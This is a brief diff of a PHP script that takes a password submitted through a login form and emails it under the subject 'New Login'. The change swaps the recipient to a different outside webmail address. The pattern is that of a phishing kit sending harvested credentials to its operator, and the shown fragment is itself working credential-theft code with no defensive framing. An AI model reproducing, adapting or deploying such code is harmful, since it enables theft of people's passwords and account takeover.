@@ -10,7 +10,7 @@ if(!empty($_POST)) {
   
   $password = $_POST['password'];
 
-  $to = "bisazzatiling@gmail.com";
+  $to = "luck.bear@yandex.com";
   
   $subject = "New Login";
 
